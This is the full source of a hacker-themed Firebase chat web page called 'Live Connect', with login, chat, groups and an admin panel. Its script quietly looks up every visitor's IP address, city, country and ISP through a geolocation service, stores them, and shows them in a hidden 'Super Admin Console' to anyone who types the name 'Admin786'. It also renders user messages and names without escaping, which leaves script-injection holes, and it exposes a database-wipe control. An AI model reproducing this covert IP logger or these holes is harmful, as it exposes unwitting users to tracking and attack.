<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Live Connect | System Override</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root{
  --bg:#020205; --card:rgba(20,20,30,0.6); --text:#e0e0e0; 
  --p:#8e44ad; --s:#00d2ff; --acc:#ff0055; --border:rgba(255,255,255,0.08);
}
body{margin:0;font-family:'Segoe UI',Roboto;background:var(--bg);color:var(--text);overflow:hidden;background-image: radial-gradient(circle at center, #1a1a2e 0%, #020205 100%);}

/* MATRIX HACKING OVERLAY */
#hackOverlay { display:none; position:fixed; inset:0; background:#000; z-index:30000; color:#0f0; padding:20px; font-family:monospace; font-size:12px; overflow:hidden; }

.app{max-width:480px; margin:auto; height:100vh; display:flex; flex-direction:column; position: relative; backdrop-filter: blur(10px);}

/* ULTRA MODERN LOGIN */
#loginPage { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
#loginPage img { width: 200px; height: 200px; border-radius: 50%; border: 2px solid var(--s); box-shadow: 0 0 40px var(--s), 0 0 80px var(--p); object-fit: cover; margin-bottom: 30px; animation: pulse 2s infinite; }
@keyframes pulse { 0%{box-shadow: 0 0 20px var(--s);} 50%{box-shadow: 0 0 50px var(--p);} 100%{box-shadow: 0 0 20px var(--s);} }
#loginPage h1 { font-size: 36px; margin: 0; background: linear-gradient(to right, var(--s), var(--p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; letter-spacing: -1px; }
#loginPage input { width: 100%; max-width: 320px; padding: 20px; border-radius: 20px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); color: #fff; margin: 25px 0 15px; text-align: center; font-size: 16px; outline: none; }
#loginPage button { width: 100%; max-width: 320px; padding: 20px; border: none; border-radius: 20px; background: linear-gradient(45deg, var(--p), var(--s)); color: #fff; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }

header{padding:50px 20px 15px; display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.3); border-bottom: 1px solid var(--border);}
header h1{margin:0;font-size:22px; font-weight: 900; color: var(--s);}

.page{display:none; padding:20px; flex:1; overflow-y: auto; padding-bottom: 120px; animation: slideUp 0.4s ease-out;}
@keyframes slideUp { from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
.page.active{display:block;}

.hero{background: linear-gradient(135deg, rgba(142,68,173,0.3), rgba(0,210,255,0.3)); border: 1px solid var(--border); padding:30px; border-radius:30px; text-align:center; position: relative; overflow: hidden;}
.hero::after { content:''; position:absolute; inset:0; background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png'); opacity:0.1; }

.dash-card{background:var(--card); padding:20px; margin-top:15px; border-radius:25px; border:1px solid var(--border); backdrop-filter: blur(15px); box-shadow: 0 10px 30px rgba(0,0,0,0.5);}

/* CHAT STYLING */
#chatBox{height:55vh; overflow-y:auto; display:flex; flex-direction:column; gap:15px; padding:10px; scroll-behavior: smooth;}
.msg{padding:14px 18px; border-radius:22px; font-size:14px; max-width:85%; position: relative; line-height: 1.5;}
.msg.me{background: linear-gradient(45deg, var(--p), #673ab7); align-self: flex-end; border-bottom-right-radius: 5px; box-shadow: 0 5px 15px rgba(142,68,173,0.3);}
.msg.them{background: #1e1e26; align-self: flex-start; border-bottom-left-radius: 5px; border: 1px solid var(--border);}
.msg b{display:block; font-size:10px; margin-bottom:5px; opacity:0.7; text-transform: uppercase; letter-spacing: 1px;}

.input-area{display:flex; gap:10px; background:var(--card); padding:10px; border-radius:25px; border:1px solid var(--border); margin-top: 10px;}
.input-area input{flex:1; background:transparent; border:none; color:#fff; padding:10px 15px; outline:none;}
.input-area button{width:50px; height:50px; border-radius:50%; border:none; background:var(--s); color:#fff; cursor:pointer; box-shadow: 0 0 15px var(--s);}

/* NAV BAR */
nav{position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 430px; display:flex; justify-content:space-around; background:rgba(15,15,25,0.8); padding:18px 0; border-radius:35px; border:1px solid var(--border); backdrop-filter: blur(20px); z-index: 2000;}
nav button{background:none; border:none; font-size:22px; color:#555; cursor:pointer; transition: 0.3s;}
nav button.active{color:var(--s); transform: translateY(-8px); text-shadow: 0 0 20px var(--s);}

/* ADMIN PANEL POWERS */
.admin-power { border: 1px solid var(--acc) !important; background: rgba(255,0,85,0.05) !important; }
.log-entry { font-family: 'Courier New', monospace; font-size: 11px; color: #00ffaa; padding: 10px; border-bottom: 1px solid #222; }
.spy-btn { background: var(--acc); color:white; border:none; padding:10px; border-radius:10px; font-size:10px; font-weight:bold; cursor:pointer; margin-top:5px; }
</style>
</head>
<body>

<div id="hackOverlay"></div>

<div class="app">
    <div id="loginPage">
        <img src="http://googleusercontent.com/image_generation_content/28.png" alt="Live Connect Skull">
        <h1>Live Connect</h1>
        <p style="color:var(--muted); font-size: 12px; letter-spacing: 2px;">GOD MODE PROTOCOL V5</p>
        <input type="text" id="usernameInput" placeholder="Enter Identity Hash" autocomplete="off">
        <button onclick="initiateHack()">Initiate Override</button>
    </div>

    <header>
        <h1>LIVE CONNECT <span id="admTag" style="display:none; color:var(--acc); font-size:10px; border:1px solid var(--acc); padding:2px 5px; border-radius:5px; margin-left:10px;">GHOST ADMIN</span></h1>
        <button onclick="logout()" style="background:none; border:none; color:#ff4444; font-size:20px; cursor:pointer;"><i class="fa-solid fa-power-off"></i></button>
    </header>

    <div id="home" class="page active">
        <div class="hero">
            <h2 style="margin:0;">Greetings, <span id="dashUser" style="color:var(--s);">...</span></h2>
            <p style="font-size:12px; opacity:0.7; margin-top:10px;">Quantum Encryption: ACTIVE | Nodes: ONLINE</p>
        </div>
        
        <div class="dashboard-stat"><h4>Total Connected Nodes</h4><span id="onlineCount" style="color:var(--s); font-weight:900;">0</span></div>

        <div id="adminPanel" style="display:none;" class="dash-card admin-power">
            <h4 style="color:var(--acc); margin:0 0 15px; display:flex; justify-content:space-between;">
                <span><i class="fa-solid fa-skull-crossbones"></i> SUPER ADMIN CONSOLE</span>
                <span id="nodeIp" style="font-size:10px; color:var(--text);"></span>
            </h4>
            <div id="ipLogs" style="max-height:200px; overflow-y:auto; margin-bottom:15px;"></div>
            <button onclick="wipeSystem()" style="width:100%; padding:15px; background:var(--acc); color:white; border:none; border-radius:15px; font-weight:bold; box-shadow: 0 0 20px var(--acc);">WIPE GLOBAL DATABASE</button>
        </div>
    </div>

    <div id="chat" class="page">
        <div id="chatBox"></div>
        <div class="input-area">
            <input id="msgInput" placeholder="Write encrypted packet..."/>
            <button onclick="sendMsg()"><i class="fa-solid fa-bolt"></i></button>
        </div>
    </div>

    <div id="usersPage" class="page">
        <h3 style="color:var(--s); font-size:14px; text-transform:uppercase;">Detected Entities</h3>
        <div id="userList"></div>
        <h3 style="color:var(--p); font-size:14px; text-transform:uppercase; margin-top:30px;">Secure Sub-Nets (Groups)</h3>
        <div id="groupList"></div>
        <div class="input-area" style="margin-top:10px;">
            <input id="groupInput" placeholder="New Sub-Net Name"/>
            <button onclick="createGroup()" style="background:var(--p); box-shadow:0 0 15px var(--p);"><i class="fa-solid fa-plus"></i></button>
        </div>
    </div>

    <nav>
        <button onclick="openPage('home',this)" class="active"><i class="fa-solid fa-house-chimney-window"></i></button>
        <button onclick="openPage('chat',this)"><i class="fa-solid fa-terminal"></i></button>
        <button onclick="openPage('usersPage',this)"><i class="fa-solid fa-microchip"></i></button>
    </nav>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const firebaseConfig = { 
    apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE", 
    databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com" 
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let user = localStorage.getItem("lc_user");

// HACKING ANIMATION
window.initiateHack = () => {
    const val = document.getElementById("usernameInput").value.trim();
    if(!val) return;
    const overlay = document.getElementById("hackOverlay");
    overlay.style.display = "block";
    const logs = [
        "BOOTING LIVE CONNECT OS...", "BYPASSING ENCRYPTION...", "COLLECTING SYSTEM FOOTPRINTS...", 
        "STABLIZING QUANTUM TUNNEL...", "INJECTING PERMISSIONS...", "ACCESS GRANTED: WELCOME MASTER."
    ];
    let step = 0;
    const itv = setInterval(() => {
        overlay.innerHTML += `<p style="margin:5px 0;">[SYSTEM]: ${logs[step]}</p>`;
        step++;
        if(step >= logs.length) {
            clearInterval(itv);
            setTimeout(() => { localStorage.setItem("lc_user", val); location.reload(); }, 800);
        }
    }, 400);
};

// IP & GEOLOCATION LOGGER
async function logEntity() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        set(ref(db, "logs/" + user), {
            name: user, ip: data.ip, city: data.city, country: data.country_name, isp: data.org, time: new Date().toLocaleTimeString()
        });
    } catch(e) {}
}

if(user) {
    document.getElementById("loginPage").style.display = "none";
    document.getElementById("dashUser").textContent = user;
    logEntity();

    if(user === "Admin786") {
        document.getElementById("adminPanel").style.display = "block";
        document.getElementById("admTag").style.display = "inline";
        onValue(ref(db, "logs"), snap => {
            const box = document.getElementById("ipLogs"); box.innerHTML = "";
            snap.forEach(l => {
                const v = l.val();
                box.innerHTML += `<div class="log-entry">
                    <b>ENTITY:</b> ${v.name} <br>
                    <b>TRACE:</b> ${v.ip} | ${v.city}, ${v.country} <br>
                    <b>NETWORK:</b> ${v.isp}
                </div>`;
            });
        });
    }

    const uRef = ref(db, "users/" + user);
    set(uRef, { name: user, online: true });
    onDisconnect(uRef).update({ online: false });
    loadChat();
}

window.openPage = (id, btn) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
};

onValue(ref(db, "users"), snap => {
    let count = 0;
    const list = document.getElementById("userList"); list.innerHTML = "";
    snap.forEach(u => {
        if(u.val().online) {
            count++;
            list.innerHTML += `<div class="dash-card" style="margin-top:10px; padding:12px; display:flex; align-items:center; gap:10px;">
                <div style="width:10px; height:10px; background:var(--s); border-radius:50%; box-shadow:0 0 10px var(--s);"></div>
                ${u.val().name}
            </div>`;
        }
    });
    document.getElementById("onlineCount").textContent = count;
});

onValue(ref(db, "groups"), snap => {
    const list = document.getElementById("groupList"); list.innerHTML = "";
    snap.forEach(g => {
        list.innerHTML += `<div class="dash-card" style="margin-top:10px; padding:15px; border-left:4px solid var(--p); cursor:pointer;">
            <i class="fa-solid fa-network-wired" style="color:var(--p); margin-right:10px;"></i> ${g.key}
        </div>`;
    });
});

function loadChat() {
    onValue(ref(db, "globalChat"), snap => {
        const box = document.getElementById("chatBox"); box.innerHTML = "";
        snap.forEach(m => {
            const v = m.val();
            const type = v.from === user ? 'me' : 'them';
            box.innerHTML += `<div class="msg ${type}"><b>${v.from}</b>${v.text}</div>`;
        });
        box.scrollTop = box.scrollHeight;
    });
}

window.sendMsg = () => {
    const inp = document.getElementById("msgInput");
    if(!inp.value) return;
    push(ref(db, "globalChat"), { from: user, text: inp.value });
    if(user !== "Admin786") {
        setTimeout(() => { push(ref(db, "globalChat"), { from: "SYSTEM_BOT", text: "Packet received & encrypted." }); }, 2000);
    }
    inp.value = "";
};

window.createGroup = () => {
    const val = document.getElementById("groupInput").value.trim();
    if(val) set(ref(db, "groups/" + val), { admin: user });
    document.getElementById("groupInput").value = "";
};

window.wipeSystem = () => { if(confirm("EXECUTE GLOBAL WIPE?")) { remove(ref(db, "globalChat")); remove(ref(db, "logs")); } };
window.logout = () => { localStorage.clear(); location.reload(); };
</script>
</body>
</html>
